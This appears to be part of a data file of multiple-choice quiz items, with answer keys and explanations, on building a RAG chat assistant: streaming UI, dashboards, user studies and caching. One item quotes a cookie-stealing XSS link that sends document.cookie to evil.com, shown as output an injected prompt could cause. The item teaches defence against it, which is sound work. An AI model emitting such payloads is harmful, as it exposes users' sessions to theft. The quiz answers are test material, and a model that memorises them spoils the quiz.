        'An LLM streams tokens at 120 tokens/sec. If your React frontend calls `setMessages()` on every single incoming SSE token packet, what UI pathology occurs?',
      options: [
        'React re-parses the entire Markdown AST and syntax highlighter 120 times per second, causing severe main-thread frame drops and scroll jank.',
        'The browser window closes automatically.',
        'The TCP socket upgrades to WebRTC.',
        'Tailwind CSS classes stop working.',
      ],
      correctIndex: 0,
      explanation:
        'Buffering incoming tokens in a `useRef` and flushing state updates at most once per `requestAnimationFrame` (60Hz) alongside memoized completed message blocks prevents render thrashing.',
    },
    {
      id: 'rfs-2',
      question:
        'Why is `AbortController` essential when managing streaming `fetch` requests inside a React chat interface?',
      options: [
        'It allows cleanly cancelling the active HTTP stream when the user clicks "Stop", submits a new query, or unmounts the component.',
        'It compresses JSON payloads by 50%.',
        'It bypasses CORS restrictions.',
        'It enables offline service workers.',
      ],
      correctIndex: 0,
      explanation:
        'Passing `abortController.signal` to `fetch()` ensures the browser closes the underlying TCP/HTTP stream immediately on cancellation, notifying the FastAPI backend to halt GPU generation.',
    },
  ],

  'react-frontend-chat-ui': [
    {
      id: 'rfcu-1',
      question:
        'A scraped documentation chunk or adversarial prompt causes the LLM to output `[Click for fix](javascript:fetch("https://evil.com?c="+document.cookie))`. How must your Markdown renderer defend against this?',
      options: [
        'Never use `dangerouslySetInnerHTML` for untrusted markdown, sanitize HTML via DOMPurify, and strictly whitelist link protocols (`http://`, `https://`, `#`) while blocking `javascript:` and `data:` URIs.',
        'Hide links using `opacity: 0`.',
        'Ask the LLM politely not to output JavaScript links.',
        'Disable all `<a>` tags in the browser.',
      ],
      correctIndex: 0,
      explanation:
        'Protocol allowlisting and strict DOM sanitization prevent XSS payloads embedded in scraped corpora or hallucinated links from executing in the user’s origin.',
    },
    {
      id: 'rfcu-2',
      question:
        'In a streaming chat UI, how do you implement "Smart Auto-Scroll" so the view follows new tokens without hijacking the scrollbar when the user scrolls up to read earlier code?',
      options: [
        'Track whether the user is within a threshold (e.g. 80px) of the bottom; pause auto-scroll as soon as upward wheel/touch scroll is detected, and resume only when they scroll back to the bottom.',
        'Call `window.scrollTo(0, 999999)` every 10ms unconditionally.',
        'Disable vertical scrolling while streaming.',
        'Only render the message after streaming is 100% finished.',
      ],
      correctIndex: 0,
      explanation:
        'Respecting user scroll intent prevents the frustrating UX trap where a user trying to copy a code block above is repeatedly yanked back to the bottom.',
    },
  ],

  'evaluation-dashboard': [
    {
      id: 'ed-1',
      question:
        'Why does reporting only the **Average (Mean)** latency on an observability dashboard hide severe production outages?',
      options: [
        'If 95% of requests hit cache in 10ms and 5% of requests time out at 10,000ms, the mean is ~509ms—completely masking the fact that 1 in 20 users experiences a 10-second hang. Always track p50, p95, and p99 percentiles.',
        'Because SQL cannot compute `AVG()`.',
        'Because latency is always negative.',
        'Because p99 is always smaller than p50.',
      ],
      correctIndex: 0,
      explanation:
        'Latency distributions in RAG systems are heavily right-skewed (multi-modal due to cache hits vs agentic loops). Tail percentiles (`PERCENTILE_CONT(0.95)`) expose real user pain.',
    },
    {
      id: 'ed-2',
      question:
        'Which diagnostic plot on the Evaluation Dashboard reveals if a retrieval update improved Faithfulness at the expense of unacceptable Latency inflation?',
      options: [
        'A 2D Pareto Frontier scatter plot mapping Faithfulness / NDCG on the Y-axis against p95 Latency / Token Cost on the X-axis.',
        'A pie chart of browser user-agents.',
        'A single counter showing total database rows.',
        'A bar chart of CSS file sizes.',
      ],
      correctIndex: 0,
      explanation:
        'Visualizing quality vs. latency/cost on a joint Pareto chart prevents teams from shipping accuracy gains that violate production latency SLAs.',
    },
  ],

  'user-study': [
    {
      id: 'us-1',
      question:
        'In a crossover A/B user study with 24 developers solving tasks using Baseline Search (A) vs DevDocs AI RAG (B), why must Half of the participants use `A -> B` while the other half use `B -> A`?',
      options: [
        'Counterbalancing (Latin Square design) eliminates learning and fatigue carry-over effects, ensuring developers don’t perform better on the second system simply because they warmed up.',
        'To double the database storage bill.',
        'Because Wilcoxon tests require at least 1,000 participants.',
        'To test if the servers work in different time zones.',
      ],
      correctIndex: 0,
      explanation:
        'Without counterbalancing, sequence/practice effects confound the treatment effect in within-subjects study designs.',
    },
    {
      id: 'us-2',
      question:
        'How does **Team Draft Interleaving** evaluate two retrieval models ($A$ and $B$) online in production without running separate A/B user cohorts?',
      options: [
        'It merges top results from $A$ and $B$ via randomized coin-toss drafting into a single list $[A_1, B_1, A_2, \\dots]$, attributing user citation clicks back to the winning model with 10x higher statistical sensitivity.',
        'It shows both full chat interfaces side-by-side on mobile screens.',
        'It asks users to write SQL queries manually.',
        'It switches models every 6 months.',
      ],
      correctIndex: 0,
      explanation:
        'Interleaving controls for per-query difficulty and user variance simultaneously, requiring orders of magnitude fewer impressions than traditional A/B testing.',
    },
  ],

  'readme-architecture': [
    {
      id: 'ra-1',
      question:
        'In a Multi-Tier RAG Caching Architecture, what is the difference between Tier-1 Cache and Tier-2 Cache?',
      options: [
        'Tier-1 is an Exact Normalized Query SHA-256 Hash lookup in Redis (~1-2ms); Tier-2 embeds the query and searches a Semantic Query Cache collection with a strict cosine threshold ($\\ge 0.96$, ~12ms).',
        'Tier-1 is stored on magnetic tape; Tier-2 is stored on floppy disks.',
        'Tier-1 caches CSS files; Tier-2 caches PNG icons.',
        'Tier-1 uses a Cross-Encoder; Tier-2 uses GPT-4.',
      ],
      correctIndex: 0,
      explanation:
        'Tier-1 catches identical repeat queries in ~1ms, while Tier-2 catches paraphrased synonymous queries ("remove null from js array" vs "filter empty elements array") in ~12ms.',
    },
    {
      id: 'ra-2',
      question:
        'If the Qdrant vector cluster suffers a network partition or timeout (>100ms) during peak traffic, how should a resilient production-grade RAG pipeline degrade gracefully?',
      options: [
        'Trip the circuit breaker and fall back to PostgreSQL BM25 Full-Text Search, maintaining 100% service availability while logging a degraded-mode alert.',
        'Return an unhandled Python traceback to all users.',
        'Retry Qdrant in an infinite blocking loop for 10 minutes.',
        'Shut down the FastAPI server.',
      ],
      correctIndex: 0,
      explanation:
        'Graceful degradation via circuit breakers trades a modest temporary dip in semantic recall for uninterrupted system availability.',
    },
  ],
};
